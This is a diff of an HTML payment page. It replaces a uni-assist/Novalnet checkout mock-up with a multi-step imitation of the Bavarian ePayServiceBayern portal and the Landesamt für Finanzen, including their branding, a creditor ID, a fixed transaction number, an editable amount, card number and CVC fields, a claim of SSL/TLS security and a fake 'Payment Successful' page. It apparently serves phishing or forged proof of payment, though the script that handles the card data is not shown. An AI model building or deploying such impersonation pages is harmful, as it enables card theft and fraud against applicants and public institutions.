@@ -3,139 +3,212 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Novalnet Payment</title>
+    <title>ePayServiceBayern - Payment Gateway</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-    <!-- মূল পেমেন্ট কন্টেইনার -->
-    <div class="checkout-container" id="checkoutContainer">
-        
-        <!-- Header Section -->
-        <header class="header">
-            <div class="logo">
-                <!-- Novalnet Logo -->
-                <img src="novalnet-logo.png" alt="Novalnet AG">
-            </div>
-            <div class="language-dropdown">
+    <!-- Header for Step 1 & 2 -->
+    <header class="header" id="header-main">
+        <div class="logo-left">
+            <!-- Left Logo Placeholder -->
+            <img src="logo-by.png" alt="BY Logo">
+        </div>
+        <div class="logo-right">
+            <!-- Right Logo Placeholder -->
+            <img src="logo-epay.png" alt="ePayServiceBayern Logo">
+            <div class="language-select">
                 <select>
-                    <option value="en">English</option>
-                    <option value="de">Deutsch</option>
+                    <option>English</option>
+                    <option>Deutsch</option>
                 </select>
             </div>
-        </header>
+        </div>
+    </header>
 
-        <!-- Order Information Section -->
-        <section class="panel">
-            <div class="panel-header">
-                <h2>ORDER INFORMATION</h2>
-            </div>
-            <div class="panel-body">
-                <p class="order-desc">uni-assist e.V. / v2 /</p>
-                <div class="order-amount">
-                    <span>Amount (EUR)</span> 
-                    <!-- টাকার পরিমাণ বসানোর ইনপুট -->
-                    <input type="number" id="paymentAmount" value="100.00" step="0.01" min="1" required class="amount-input">
+    <!-- Header for Step 3 -->
+    <header class="header-finanzen" id="header-finanzen" style="display: none;">
+        <img src="logo-finanzen.png" alt="Landesamt für Finanzen">
+        <h2>Landesamt für Finanzen (Gläubiger-ID: DE800R100000190298)</h2>
+    </header>
+
+    <!-- MAIN CONTAINER -->
+    <div class="container">
+        
+        <!-- ================= STEP 1: Select Method ================= -->
+        <div id="step1" class="panel">
+            <div class="info-row">
+                <span class="label">Amount:</span>
+                <!-- Editable Amount -->
+                <div class="amount-input-group">
+                    <input type="number" id="customAmount" value="60.00" step="0.01" min="1">
+                    <span>EUR</span>
                 </div>
             </div>
-        </section>
-
-        <!-- Payment Option Section -->
-        <section class="panel">
-            <div class="panel-header">
-                <h2>PAYMENT OPTION</h2>
+            <div class="info-row">
+                <span class="label">Transaction:</span>
+                <span>15059652317057</span>
             </div>
-            <div class="panel-body payment-body">
-                
-                <!-- Payment Method Title -->
-                <div class="payment-method-title">
-                    <label class="radio-label">
-                        <input type="radio" name="payment_type" checked>
-                        <strong>Credit/Debit Cards</strong>
-                    </label>
-                    <div class="card-icons">
-                        <img src="visa-icon.png" alt="Visa">
-                        <img src="mastercard-icon.png" alt="Mastercard">
-                    </div>
-                </div>
 
-                <div class="payment-form-area">
-                    <p class="info-text">The amount will be debited from your credit card once the order is submitted</p>
+            <div class="instruction">
+                Please select one of the following payment methods. You will be guided through the payment dialog. Please note that credit card payments are only possible if your bank supports the 3D Secure security procedure.
+            </div>
+
+            <div class="payment-methods">
+                <label>
+                    <input type="radio" name="method" value="MasterCard (3D Secure)" checked>
+                    <strong>MasterCard (3D Secure)</strong>
+                </label>
+                <label>
+                    <input type="radio" name="method" value="Visa (3D Secure)">
+                    <strong>Visa (3D Secure)</strong>
+                </label>
+                <label>
+                    <input type="radio" name="method" value="PayPal">
+                    <strong>PayPal</strong>
+                </label>
+            </div>
+
+            <div class="actions">
+                <button type="button" class="btn btn-secondary">Back</button>
+                <button type="button" class="btn btn-primary" id="btnNext1">Next</button>
+            </div>
+        </div>
+
+        <!-- ================= STEP 2: Start Payment ================= -->
+        <div id="step2" class="panel" style="display: none;">
+            <div class="step-title">Start payment</div>
+            
+            <div class="info-row">
+                <span class="label">Amount:</span>
+                <span><strong id="displayAmount2">60.00</strong> EUR</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Transaction:</span>
+                <span>15059652317057</span>
+            </div>
+            <div class="info-row">
+                <span class="label">Start Payment</span>
+                <span id="displayMethod2">MasterCard 3D Secure</span>
+            </div>
+
+            <div class="actions">
+                <button type="button" class="btn btn-secondary" id="btnBack2">Back</button>
+                <button type="button" class="btn btn-primary" id="btnNext2">Start Payment</button>
+            </div>
+        </div>
+
+        <!-- ================= STEP 3: Card Details ================= -->
+        <div id="step3" class="panel step3-panel" style="display: none;">
+            <div class="split-layout">
+                <!-- Left Side: Form -->
+                <div class="left-col">
+                    <h3 class="section-title">Please provide payment details</h3>
                     
-                    <!-- Payment Form -->
-                    <form id="paymentForm">
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="cardHolder">Card holder*</label>
-                                <div class="input-with-icon">
-                                    <input type="text" id="cardHolder" required>
-                                    <span class="icon">👤</span>
-                                </div>
-                            </div>
-                            <div class="form-group">
-                                <label for="cardNumber">Card number*</label>
-                                <div class="input-with-icon">
-                                    <input type="text" id="cardNumber" required>
-                                    <span class="icon">💳</span>
-                                </div>
-                            </div>
+                    <div class="form-group mb-4">
+                        <label>Payment method</label>
+                        <div class="selected-method-display">
+                            <img src="mastercard-logo.png" alt="Card Logo" width="30" id="cardLogoStep3">
+                            <span id="displayMethod3">Mastercard</span>
                         </div>
+                    </div>
 
-                        <div class="form-row date-cvc-row">
-                            <div class="form-group date-select">
-                                <label for="month">Month*</label>
-                                <select id="month" required>
-                                    <option value="" disabled selected>Month</option>
+                    <form id="cardForm">
+                        <div class="form-group">
+                            <label>Card Number</label>
+                            <input type="text" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Cardholder Name</label>
+                            <input type="text" required>
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group half">
+                                <label>Expiration Month</label>
+                                <select required>
+                                    <option value="">Month</option>
                                     <option value="01">01</option>
                                     <option value="02">02</option>
                                     <option value="03">03</option>
                                     <option value="04">04</option>
                                     <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
                                 </select>
                             </div>
-                            <div class="form-group date-select">
-                                <label for="year">Year*</label>
-                                <select id="year" required>
-                                    <option value="" disabled selected>Year</option>
+                            <div class="form-group half">
+                                <label>Expiration Year</label>
+                                <select required>
+                                    <option value="">Year</option>
                                     <option value="2024">2024</option>
                                     <option value="2025">2025</option>
                                     <option value="2026">2026</option>
                                     <option value="2027">2027</option>
                                 </select>
                             </div>
-                            <div class="form-group cvc-group">
-                                <label for="cvc">CVC / CVV*</label>
-                                <input type="text" id="cvc" required>
+                            <div class="form-group half">
+                                <label>Card Code</label>
+                                <div class="cvc-input">
+                                    <input type="text" required>
+                                    <span class="eye-icon">👁️</span>
+                                </div>
                             </div>
                         </div>
 
-                        <div class="checkbox-row">
-                            <label>
-                                <input type="checkbox" required>
-                                You hereby agree to store the Token by continuing to pay
-                            </label>
-                        </div>
-
-                        <div class="submit-btn-area">
-                            <button type="submit" class="pay-btn">Submit Payment</button>
+                        <div class="actions step3-actions">
+                            <button type="button" class="btn btn-cancel" id="btnBack3">CANCEL</button>
+                            <button type="submit" class="btn btn-primary">CONTINUE</button>
                         </div>
                     </form>
                 </div>
+
+                <!-- Right Side: Order Summary -->
+                <div class="right-col">
+                    <h3 class="section-title">Your Order</h3>
+                    <div class="order-summary-box">
+                        <strong>Amount</strong>
+                        <strong>€ <span id="displayAmount3">60.00</span> EUR</strong>
+                    </div>
+
+                    <div class="secure-note">
+                        <span class="lock-icon">🔒</span>
+                        <p>This is a secure page which uses SSL/TLS (Secure Socket Layer/Transport Layer Security) to encrypt and securely transmit your payment data.</p>
+                    </div>
+                </div>
             </div>
-        </section>
+        </div>
 
     </div>
 
-    <!-- Payment Success Page (শুরুতে হাইড করা থাকবে) -->
-    <div id="successPage" class="success-page" style="display: none;">
+    <!-- ================= STEP 4: Success Page ================= -->
+    <div id="step4" class="success-page" style="display: none;">
         <div class="success-content">
             <div class="checkmark-circle"></div>
             <h2>Payment Successful!</h2>
-            <p>Thank you. Your payment of <strong id="paidAmount"></strong> <strong>EUR</strong> has been successfully processed.</p>
-            <p class="redirect-text">Redirecting to uni-assist portal in a few seconds...</p>
+            <p>Your payment of <strong><span id="finalAmount"></span> EUR</strong> was processed successfully.</p>
+            <p class="redirect-text">Redirecting to Sign in for Online Application...</p>
         </div>
     </div>
 
-    <script src="script.js"></script> 
+    <!-- Footers -->
+    <footer class="footer" id="main-footer">
+        <a href="#">🔒 Privacy policy</a>
+        <a href="#">§ Legal Notice</a>
+        <a href="#">⌨ Accessibility</a>
+    </footer>
+
+    <footer class="footer-alt" id="alt-footer" style="display: none;">
+        <a href="#">Cookies</a>
+        <a href="#">Data Privacy</a>
+        <a href="#">Legal Notice/Impressum</a>
+    </footer>
+
+    <script src="script.js"></script>
 </body>
 </html>
